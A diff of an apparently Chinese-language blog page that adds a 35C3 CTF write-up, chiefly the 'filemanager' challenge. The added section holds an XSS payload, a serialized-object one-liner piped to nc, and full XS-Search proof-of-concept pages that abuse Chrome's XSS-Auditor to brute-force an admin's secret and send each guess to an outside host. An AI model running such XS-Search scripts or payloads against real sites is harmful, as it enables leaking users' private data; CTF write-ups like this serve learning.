@@ -261,7 +261,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">4,364</span> / Reading time: <span class="post-count">26 min</span></span>
+                        <span>Word count: <span class="post-count">6,205</span> / Reading time: <span class="post-count">37 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -438,11 +438,61 @@
 <h1 id="35C3"><a href="#35C3" class="headerlink" title="35C3"></a>35C3</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;O:1:&quot;B&quot;:1:&#123;&#125;&apos; | nc 35.242.207.13 1</span><br></pre></td></tr></table></figure>
 <p>构造一个错误的序列化数据，从而在抛出异常时，调用<code>_destruct</code>.</p>
 <h3 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a>lambda</h3><p>采用gRPC server，安装grpcurl，可以直接和gRPC服务器进行交互。</p>
-<h3 id="filemanager"><a href="#filemanager" class="headerlink" title="filemanager"></a>filemanager</h3><p>漏洞代码:</p>
+<h3 id="filemanager"><a href="#filemanager" class="headerlink" title="filemanager"></a>filemanager</h3><p>漏洞代码: </p>
+<p>这里的<code>${q}</code>可以触发xss。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    (()=&gt;&#123;</span><br><span class="line">      for (let pre of document.getElementsByTagName(&apos;pre&apos;)) &#123;</span><br><span class="line">        let text = pre.innerHTML;</span><br><span class="line">        let q = &apos;document&apos;;</span><br><span class="line">        let idx = text.indexOf(q);</span><br><span class="line">        pre.innerHTML = `$&#123;text.substr(0, idx)&#125;&lt;mark&gt;$&#123;q&#125;&lt;/mark&gt;$&#123;text.substr(idx+q.length)&#125;`;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure>
 <p>javascript:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x3b\x3e\n`</span><br><span class="line">=&gt; </span><br><span class="line">&quot;&lt;img src=x onerror=alert(document.cookie);&gt;</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure>
 <p>反引号可以将字符串中的16进制，或者特殊符号转化</p>
+<p>TIPS:</p>
+<p>test.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line"> </span><br><span class="line">            $password = @$_GET[&quot;password&quot;];</span><br><span class="line">            if($password==&apos;admin&apos;)&#123; // 这里模拟我们要猜测的值</span><br><span class="line">                echo &quot;you get it.&quot; ;</span><br><span class="line">                echo &quot;&lt;script&gt;let a=&apos;test&apos;;&lt;/script&gt;&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &quot;guess error!&quot; ;</span><br><span class="line">            &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>poc.html:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--filename:poc.html --&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    iframe &#123;</span><br><span class="line">        display: none;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;iframe id=f&gt;&lt;/iframe&gt;</span><br><span class="line">    &lt;div id=log&gt;&lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">       var myframes = [];</span><br><span class="line">            function go(x) &#123;</span><br><span class="line">                var f = document.createElement(&apos;iframe&apos;);</span><br><span class="line">                myframes.push(f);</span><br><span class="line">                document.body.appendChild(f)</span><br><span class="line">                var start = performance.now()</span><br><span class="line">                f.onload = function() &#123;</span><br><span class="line">                    f.onload = function() &#123;</span><br><span class="line">                        console.log(&quot;second request!&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    console.log(&quot;first request!&quot;);</span><br><span class="line">                    f.src=f.src+&apos;#&apos;;</span><br><span class="line">                &#125;</span><br><span class="line">                f.src = `http://192.168.21.149/test.php?password=$&#123;encodeURIComponent(x)&#125;&amp;&lt;script&gt;let%20a=%27test%27;&lt;\/script&gt;`;</span><br><span class="line">            &#125;</span><br><span class="line">            var payload1 = &apos;admin&apos;;</span><br><span class="line">            var payload2 = &apos;test&apos;;</span><br><span class="line">            go(payload1);</span><br><span class="line">            go(payload2);</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>请求Poc.html:</p>
+<p><img src="/assets/35c3/TIM截图20190103102155.png" alt=""></p>
+<p>总共发送了3次请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f.onload = function() &#123;</span><br><span class="line">            f.onload = function() &#123;</span><br><span class="line">               console.log(&quot;second request!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            console.log(&quot;first request!&quot;);</span><br><span class="line">            f.src=f.src+&apos;#&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里在url后边加上<code>#</code>，浏览器认为url没有修改，所以不会再次重新请求，所以应该是2次请求，出现3次的原因是，<code>XSS-Autidor</code>拦截之后，浏览器认为页面没有加载成功，所以在url后边添加一个<code>#</code>之后，浏览器会在请求一次。</p>
+<p>日志如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.21.1 - - [03/Jan/2019:10:14:11 +0800] &quot;GET /test.php?password=admin&amp;%3Cscript%3Elet%20a=%27test%27;%3C/script%3E HTTP/1.1&quot; 200 241 &quot;http://192.168.21.149/poc.html&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot;</span><br><span class="line">192.168.21.1 - - [03/Jan/2019:10:14:11 +0800] &quot;GET /test.php?password=test&amp;%3Cscript%3Elet%20a=%27test%27;%3C/script%3E HTTP/1.1&quot; 200 224 &quot;http://192.168.21.149/poc.html&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot;</span><br><span class="line">192.168.21.1 - - [03/Jan/2019:10:14:12 +0800] &quot;GET /test.php?password=admin&amp;%3Cscript%3Elet%20a=%27test%27;%3C/script%3E HTTP/1.1&quot; 200 241 &quot;http://192.168.21.149/poc.html&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot;</span><br></pre></td></tr></table></figure>
+<p><code>password=admin</code>会触发<code>XSS-Auditor</code>，利用这一点可以实现bool盲注的效果。</p>
+<p>回到题目上来:</p>
+<p>随便创建一个文件:</p>
+<p><img src="/assets/35c3/TIM截图20190103110323.png" alt=""></p>
+<p>name: abc         content: def</p>
+<p>访问url:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://filemanager.appspot.com/search?q=d&amp;a=%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b</span><br></pre></td></tr></table></figure>
+<p>也就是搜索<code>d</code>:</p>
+<p>可以看到XSS-Auditor检测到了攻击:</p>
+<p><img src="/assets/35c3/TIM截图20190103110546.png" alt=""></p>
+<p>查看源码:</p>
+<p><img src="/assests/35c3/TIM截图20190103110637.png" alt=""></p>
+<p>js代码变成了红色，也说明XSS-Auditor检测到攻击。</p>
+<p>通过题目可以知道flag以文件的形式保存在管理员的账号中，并且flag的形式为35c3_<em>**</em>。</p>
+<p>这样，当我们搜索文件的时候，便可以搜索到flag。</p>
+<p>注意:</p>
+<ul>
+<li>To clarify: <code>a</code> is just foo parameter name, we just wanna make XSS-Auditor see it’s as XSS vector.</li>
+</ul>
+<p>参考文章或链接:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">Briefly, we all know that flag is stored as `file` in admin account. Plus, the flag is in the format: 35C3_***</span><br><span class="line">When we searching content of a file, if it does exists, there is a script which doing highlight the found word by yellow &lt;mark&gt;</span><br><span class="line">For example: https://filemanager.appspot.com/search?q=def</span><br><span class="line">  &lt;h1&gt;abc&lt;/h1&gt;</span><br><span class="line">  &lt;pre&gt;def&lt;/pre&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    (()=&gt;&#123;</span><br><span class="line">      for (let pre of document.getElementsByTagName(&apos;pre&apos;)) &#123;</span><br><span class="line">        let text = pre.innerHTML;</span><br><span class="line">        let q = &apos;def&apos;;</span><br><span class="line">        let idx = text.indexOf(q);</span><br><span class="line">        pre.innerHTML = `$&#123;text.substr(0, idx)&#125;&lt;mark&gt;$&#123;q&#125;&lt;/mark&gt;$&#123;text.substr(idx+q.length)&#125;`;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">Okay, now let&apos;s go to XSS Auditor part.</span><br><span class="line">Try this on Chrome (yea we should, since the description saying that the admin is using Chrome-headless)</span><br><span class="line">view-source:https://filemanager.appspot.com/search?q=def&amp;a=%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b</span><br><span class="line">You can see the red alert, which means that XSS-Auditor found a XSS vector on our URL (`a` param) which also showing in the page&apos;s content. But in fact, it&apos;s *NOT XSS* , this is side effect of the auditor</span><br><span class="line">We leverage on its mechanism to detect whether there is search result (guessing flag) or not.</span><br><span class="line">* To clarify: `a` is just foo parameter name, we just wanna make XSS-Auditor see it&apos;s as XSS vector.</span><br><span class="line">But how do we do that ? Since XSS-Auditor will detect and block the page, redirect the page to `chrome-error://chromewebdata/` as well.</span><br><span class="line">Now the trick comes by. by reading this post: https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning</span><br><span class="line">I found out, it&apos;s possible to detect if the browser redirects to other page.</span><br><span class="line">Yep, and that&apos;s all.</span><br><span class="line">We can guess the flag by performing XS-Search leverage on XSS-Auditor </span><br><span class="line">--&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">		var URL = &apos;https://filemanager.appspot.com/search?q=&#123;&#123;search&#125;&#125;&amp;a=%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b&apos;;</span><br><span class="line">		var charset = &apos;_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;\&apos;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~&apos;;</span><br><span class="line">		var brute = new URLSearchParams(location.search).get(&apos;brute&apos;) || &apos;35C3_&apos;;</span><br><span class="line">		function guess(i)&#123;</span><br><span class="line">			var go = brute + charset[i];</span><br><span class="line">			var x = document.createElement(&apos;iframe&apos;);</span><br><span class="line">			x.name = &apos;blah&apos;;</span><br><span class="line">			var calls = 0;</span><br><span class="line">			x.onload = () =&gt; &#123;</span><br><span class="line">				calls++;</span><br><span class="line">				if(calls &gt; 1)&#123; </span><br><span class="line">					// so here is calling 2nd onload which means the xss auditor blocking this and the page is redirected to chrome-error://</span><br><span class="line">					// https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning</span><br><span class="line">					console.log(&quot;GO IT ==&gt; &quot;,go);</span><br><span class="line">					location.href = &apos;http://deptrai.l4w.pw/35c3/go.html?brute=&apos;+escape(go);</span><br><span class="line">					x.onload = ()=&gt;&#123;&#125;;</span><br><span class="line">				&#125;</span><br><span class="line">				var anchor = document.createElement(&apos;a&apos;);</span><br><span class="line">				anchor.target = x.name;</span><br><span class="line">				anchor.href = x.src+&apos;#&apos;;</span><br><span class="line">				anchor.click();</span><br><span class="line">				anchor = null;</span><br><span class="line">			&#125;</span><br><span class="line">			x.src = URL.replace(&apos;&#123;&#123;search&#125;&#125;&apos;,go);</span><br><span class="line">			document.body.appendChild(x);</span><br><span class="line">			setTimeout(() =&gt;&#123;</span><br><span class="line">				document.body.removeChild(x);</span><br><span class="line">				guess(i+1);</span><br><span class="line">			&#125;,1000);</span><br><span class="line">		&#125;</span><br><span class="line">		guess(0);</span><br><span class="line">		// FLAG: 35C3_xss_auditor_for_the_win</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><a href="https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning" rel="external nofollow" target="_blank">https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning</a></li>
+<li><a href="https://xz.aliyun.com/t/3241" rel="external nofollow" target="_blank">https://xz.aliyun.com/t/3241</a>       上一篇文章的中文版</li>
+</ul>
+<p>POC：</p>
+<p>poc.html:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">iframe &#123;</span><br><span class="line">    display: none;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;iframe id=f&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;div id=log&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var flag = &apos;35C3_xss_auditor_for_th&apos;;</span><br><span class="line">    var _keys_ = &apos;0123456789[] abcdefghijklmnopqrstuvwxyz&#123;&#125;ABCDEFGHIJKLMNOPQRSTUVWXYZ_!@#$%^&amp;*()&apos;;</span><br><span class="line">    var myframes = [];</span><br><span class="line"></span><br><span class="line">    function go(x) &#123;</span><br><span class="line">        var f = document.createElement(&apos;iframe&apos;);</span><br><span class="line">        myframes.push(f);</span><br><span class="line">        document.body.appendChild(f)</span><br><span class="line">        var start = performance.now()</span><br><span class="line">        f.onload = function() &#123;</span><br><span class="line">            f.onload = function() &#123;</span><br><span class="line">                console.log(log.innerHTML = &apos;hit! &apos; + x + &apos;&lt;br&gt;&apos;)</span><br><span class="line">                fetch(&apos;/?flag=&apos;+x+&apos;&amp;&apos;+Math.random())</span><br><span class="line">                myframes.map(f =&gt; document.body.removeChild(f))</span><br><span class="line">                myframes.length = 0</span><br><span class="line">                flag = x;</span><br><span class="line">                exploit()</span><br><span class="line">            &#125;</span><br><span class="line">            f.src=f.src+&apos;#&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        f.src = `https://filemanager.appspot.com/search?q=$&#123;encodeURIComponent(x)&#125;&amp;%0A%20%20&lt;script&gt;%0A%20%20%20%20%28%28%29%3D&gt;%7B%0A%20%20%20%20%20%20for%20%28let%20pre%20of%20document.getElementsByTagName%28%27pre%27%29%29%20%7B%0A%20%20%20%20%20%20%20%20let%20text%20%3D%20pre.innerHTML%3B`;</span><br><span class="line">    &#125;</span><br><span class="line">    function exploit() &#123;</span><br><span class="line">        for(var i = 0; i &lt; _keys_.length; i++) &#123;</span><br><span class="line">            go(flag + _keys_[i])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    exploit()</span><br><span class="line"></span><br><span class="line">    // navigator.serviceWorker.register(&apos;/xs-search.js&apos;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>poc1.html:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;haha&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">        var URL = &apos;https://filemanager.appspot.com/search?q=&#123;&#123;search&#125;&#125;&amp;a=%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b&apos;;</span><br><span class="line">        var charset = &apos;_abcdefghijklmnopqrstuvwxyz&apos;;</span><br><span class="line">        var brute = new URLSearchParams(location.search).get(&apos;brute&apos;) || &apos;35C3_&apos;;</span><br><span class="line">        function guess(i)&#123;</span><br><span class="line">            var go = brute + charset[i];</span><br><span class="line">            var x = document.createElement(&apos;iframe&apos;);</span><br><span class="line">            x.name = &apos;blah&apos;;</span><br><span class="line">            var calls = 0;</span><br><span class="line">            x.onload = () =&gt; &#123;</span><br><span class="line">                calls++;</span><br><span class="line">                if(calls &gt; 1)&#123; </span><br><span class="line">                    // so here is calling 2nd onload which means the xss auditor blocking this and the page is redirected to chrome-error://</span><br><span class="line">                    // https://portswigger.net/blog/exposing-intranets-with-reliable-browser-based-port-scanning</span><br><span class="line">                    console.log(&quot;GO IT ==&gt; &quot;,go);</span><br><span class="line">                    location.href = &apos;http://deptrai.l4w.pw/35c3/go.html?brute=&apos;+escape(go);</span><br><span class="line">                    x.onload = ()=&gt;&#123;&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">                var anchor = document.createElement(&apos;a&apos;);</span><br><span class="line">                anchor.target = x.name;</span><br><span class="line">                anchor.href = x.src+&apos;#&apos;;</span><br><span class="line">                anchor.click();</span><br><span class="line">                anchor = null;</span><br><span class="line">            &#125;</span><br><span class="line">            x.src = URL.replace(&apos;&#123;&#123;search&#125;&#125;&apos;,go);</span><br><span class="line">            document.body.appendChild(x);</span><br><span class="line">            setTimeout(() =&gt;&#123;</span><br><span class="line">                document.body.removeChild(x);</span><br><span class="line">                guess(i+1);</span><br><span class="line">            &#125;,1000);</span><br><span class="line">        &#125;</span><br><span class="line">        guess(0);</span><br><span class="line">        // FLAG: 35C3_xss_auditor_for_the_win</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="post"><a href="#post" class="headerlink" title="post"></a>post</h3><p><a href="https://github.com/eboda/35c3.git" rel="external nofollow" target="_blank">https://github.com/eboda/35c3.git</a></p>
+<h2 id="pwn-amp-others"><a href="#pwn-amp-others" class="headerlink" title="pwn&amp;others"></a>pwn&amp;others</h2><ul>
+<li><a href="https://github.com/bkth/35c3ctf.git" rel="external nofollow" target="_blank">https://github.com/bkth/35c3ctf.git</a></li>
+<li><a href="https://github.com/saelo/35c3ctf.git" rel="external nofollow" target="_blank">https://github.com/saelo/35c3ctf.git</a></li>
+<li><a href="https://github.com/tharina/35c3ctf.git" rel="external nofollow" target="_blank">https://github.com/tharina/35c3ctf.git</a></li>
+<li><a href="https://github.com/niklasb/35c3ctf-challs.git" rel="external nofollow" target="_blank">https://github.com/niklasb/35c3ctf-challs.git</a></li>
+</ul>
 <h1 id="check"><a href="#check" class="headerlink" title="check"></a>check</h1><p>35C3_use_this_to_decrypt_encrypted_downloads</p>
 
     </article>
@@ -582,7 +632,7 @@
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Junoir-ctf"><span class="toc-number">1.</span> <span class="toc-text">Junoir  ctf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flags"><span class="toc-number">1.1.1.</span> <span class="toc-text">flags</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#McDonald"><span class="toc-number">1.1.2.</span> <span class="toc-text">McDonald</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#blind"><span class="toc-number">1.1.3.</span> <span class="toc-text">blind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#collider"><span class="toc-number">1.1.4.</span> <span class="toc-text">collider</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DB-secret"><span class="toc-number">1.1.5.</span> <span class="toc-text">DB secret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#localhost"><span class="toc-number">1.1.6.</span> <span class="toc-text">localhost</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#saltfish"><span class="toc-number">1.1.7.</span> <span class="toc-text">saltfish</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#logged-in"><span class="toc-number">1.1.8.</span> <span class="toc-text">logged in</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Note-accessible"><span class="toc-number">1.1.9.</span> <span class="toc-text">Note accessible</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#35C3"><span class="toc-number">2.</span> <span class="toc-text">35C3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php"><span class="toc-number">2.1.1.</span> <span class="toc-text">php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lambda"><span class="toc-number">2.1.2.</span> <span class="toc-text">lambda</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filemanager"><span class="toc-number">2.1.3.</span> <span class="toc-text">filemanager</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#check"><span class="toc-number">3.</span> <span class="toc-text">check</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Junoir-ctf"><span class="toc-number">1.</span> <span class="toc-text">Junoir  ctf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flags"><span class="toc-number">1.1.1.</span> <span class="toc-text">flags</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#McDonald"><span class="toc-number">1.1.2.</span> <span class="toc-text">McDonald</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#blind"><span class="toc-number">1.1.3.</span> <span class="toc-text">blind</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#collider"><span class="toc-number">1.1.4.</span> <span class="toc-text">collider</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DB-secret"><span class="toc-number">1.1.5.</span> <span class="toc-text">DB secret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#localhost"><span class="toc-number">1.1.6.</span> <span class="toc-text">localhost</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#saltfish"><span class="toc-number">1.1.7.</span> <span class="toc-text">saltfish</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#logged-in"><span class="toc-number">1.1.8.</span> <span class="toc-text">logged in</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Note-accessible"><span class="toc-number">1.1.9.</span> <span class="toc-text">Note accessible</span></a></li></ol></li></ol></li><li 